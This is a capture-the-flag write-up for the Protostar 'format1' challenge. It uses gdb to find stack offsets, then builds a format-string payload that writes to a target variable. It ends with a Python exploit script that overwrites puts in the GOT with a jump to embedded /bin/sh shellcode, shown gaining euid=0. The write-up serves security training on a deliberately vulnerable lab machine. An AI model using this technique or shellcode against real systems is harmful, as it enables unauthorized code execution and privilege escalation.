# format1

## solution
First we need to find the offset to the start of our input.
```
(gdb) disas vuln
Dump of assembler code for function vuln:
0x080483f4 <vuln+0>:	push   %ebp
0x080483f5 <vuln+1>:	mov    %esp,%ebp
0x080483f7 <vuln+3>:	sub    $0x18,%esp
0x080483fa <vuln+6>:	mov    0x8(%ebp),%eax
0x080483fd <vuln+9>:	mov    %eax,(%esp)
0x08048400 <vuln+12>:	call   0x8048320 <printf@plt>
0x08048405 <vuln+17>:	mov    0x8049638,%eax
0x0804840a <vuln+22>:	test   %eax,%eax
0x0804840c <vuln+24>:	je     0x804841a <vuln+38>
0x0804840e <vuln+26>:	movl   $0x8048500,(%esp)
0x08048415 <vuln+33>:	call   0x8048330 <puts@plt>
0x0804841a <vuln+38>:	leave  
0x0804841b <vuln+39>:	ret    
End of assembler dump.
(gdb) b *0x08048400
Breakpoint 1 at 0x8048400: file format1/format1.c, line 10.
(gdb) r AAAA
Starting program: /opt/protostar/bin/format1 AAAA

Breakpoint 1, 0x08048400 in vuln (string=0xbffff981 "AAAA") at format1/format1.c:10
10	format1/format1.c: No such file or directory.
	in format1/format1.c
(gdb) x/x $esp
0xbffff760:	0xbffff981
(gdb) x/s 0xbffff981
0xbffff981:	 "AAAA"
(gdb) p (0xbffff981 - 0xbffff760) / 4
$2 = 136
(gdb) r 'AAAA%135$x'
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /opt/protostar/bin/format1 'AAAA%135$x'

Breakpoint 1, 0x08048400 in vuln (string=0xbffff97b "AAAA%135$x") at format1/format1.c:10
10	in format1/format1.c
(gdb) x/x $esp
0xbffff760:	0xbffff97b
```

```
>>> a = 0xbffff97b - 0xbffff760
>>> a/4
134
>>> a%4
3
```

So our offset is at 134 words and 3 bytes (where a word is 4 bytes).

Next we need to find the address of the 'target' variable, so we can modify it.
```
(gdb) disas vuln
Dump of assembler code for function vuln:
0x080483f4 <vuln+0>:	push   %ebp
0x080483f5 <vuln+1>:	mov    %esp,%ebp
0x080483f7 <vuln+3>:	sub    $0x18,%esp
0x080483fa <vuln+6>:	mov    0x8(%ebp),%eax
0x080483fd <vuln+9>:	mov    %eax,(%esp)
0x08048400 <vuln+12>:	call   0x8048320 <printf@plt>
0x08048405 <vuln+17>:	mov    0x8049638,%eax
0x0804840a <vuln+22>:	test   %eax,%eax
0x0804840c <vuln+24>:	je     0x804841a <vuln+38>
0x0804840e <vuln+26>:	movl   $0x8048500,(%esp)
0x08048415 <vuln+33>:	call   0x8048330 <puts@plt>
0x0804841a <vuln+38>:	leave  
0x0804841b <vuln+39>:	ret
```

It's pretty clear that `0x8049638` is our target, from the disassembly of the vuln function.

So next we need to craft an input that writes the data we want to the address we specify - in this
case, modifying the data at our target address to anything other than zero. Since we don't
actually have to get it to a specific value, we can just craft a payload that looks like the
following.
```
\x38\x96\x04\x08AAA%134$n <- write
^               ^   ^ offset of 135 words
target          extra bytes
```

```
user@protostar:/opt/protostar/bin$ ./format1 $(python -c 'print "\x38\x96\x04\x08%129$n"') && echo
8you have modified the target :)
user@protostar:/opt/protostar/bin$ 
```

## Shell
```
(gdb) r $(python -c 'print "AAAABBBBC%136$x%137$x"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /opt/protostar/bin/format1 $(python -c 'print "AAAABBBBC%136$x%137$x"')

Breakpoint 1, 0x08048400 in vuln (string=0xbffff970 "AAAABBBBC%136$x%137$x") at format1/format1.c:10
10	in format1/format1.c
(gdb) c
Continuing.
AAAABBBBC4141414142424242
```

```
user@protostar:/opt/protostar/bin$ objdump -R ./format1

./format1:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049608 R_386_GLOB_DAT    __gmon_start__
08049618 R_386_JUMP_SLOT   __gmon_start__
0804961c R_386_JUMP_SLOT   __libc_start_main
08049620 R_386_JUMP_SLOT   printf
08049624 R_386_JUMP_SLOT   puts
```

```py
import struct

target = struct.pack('I', 0x8049638)

tar_p1 = struct.pack('I', 0x08049624)
tar_p2 = struct.pack('I', 0x08049624 + 0x2)

nop = '\x90' * 0x80

buf = '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9'
buf += '\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89'
buf += '\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'

payload = target + tar_p1 + tar_p2

payload += 'AAA'
payload += '%10d' + '%129$n'
payload += '%63797d' + '%130$n'  
payload += '%50865d' + '%131$n'

print payload + nop + buf
```

Here it is in action.
```
user@protostar:/opt/protostar/bin$ ./format1 $(python /tmp/pwn.py)

...

# id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
```
